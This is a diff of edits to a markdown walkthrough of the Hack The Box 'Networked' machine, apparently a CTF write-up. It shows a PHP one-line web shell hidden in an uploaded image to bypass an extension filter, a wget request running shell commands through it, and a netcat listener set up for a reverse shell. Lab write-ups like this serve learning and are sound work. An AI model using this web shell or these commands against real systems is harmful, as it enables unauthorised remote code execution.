@@ -246,7 +246,7 @@ if( isset($_POST['submit']) ) {
 ```
 So, given my poor php comprehension I believe this is checking for valid image extensions (jpg, png, gif, jpeg) and for a filesize less than 60000 bytes. It also will set permissions of the file to *rw* for the owner and *r* for group.other.
 
-Navigating to http://10.10.10.146/upload.php, it looks like it matches what we can see in the upload.php file itself. I created a test.txt file and tried to upload it. Sure enough - I was denied due to file type. I wanted to test to make sure it was functioning to allow so I found a random jpg image (A-10s are the best) and successfully uploaded it to 10.10.10.146/photos.php
+Navigating to `http://10.10.10.146/upload.php`, it looks like it matches what we can see in the upload.php file itself. I created a test.txt file and tried to upload it. Sure enough - I was denied due to file type. I wanted to test to make sure it was functioning to allow so I found a random jpg image (A-10s are my favorite) and successfully uploaded it to `http://10.10.10.146/photos.php`
 
 ![Warthog](./images/warthog.jpg)  
 **Figure 1:** Warthog
@@ -259,10 +259,10 @@ The payload in the image is this:
 ```php
 <?=$_GET[0]($_POST[1]);?>
 ```
-So given the url
+Example of usage:
 ```http://website.com/cmd.php?0=shell_exec -d 1=id```
 
-In the URL, `**?0=cmd**` is the command passed through a GET variable, and I pass `**1=id**` as a POST variable.
+In the URL, `?0=cmd` is the command passed through a GET variable, and I pass `1=id` as a POST variable.
 
 ```console
 root@endeavour:~/htb/networked# wget -q -O - http://10.10.10.146/uploads/10_10_14_75.php.png?0=shell_exec --post-data="1=id"
@@ -280,7 +280,7 @@ X����s^7�����~_�}�'���ɿ_�|�00cٹg��=2��
 F�(�`��Q0
 ��
 ```
-so we passed both **id** and **pwd** as variables in our command and received that we are user **apache** and ar ein the **/var/www/html/uploads** directory. But this is quite clunky, lets try to get out of a webshell and into something a little more workable. Lets set up a listener first:
+so we passed both **id** and **pwd** as variables in our command and received that we are user **apache** and are in the **/var/www/html/uploads** directory. But this is quite clunky, lets try to get out of a webshell and into something a little more workable. Lets set up a listener first:
 
 ```console
 root@endeavour:~/htb/networked# nc -lvnp 42069
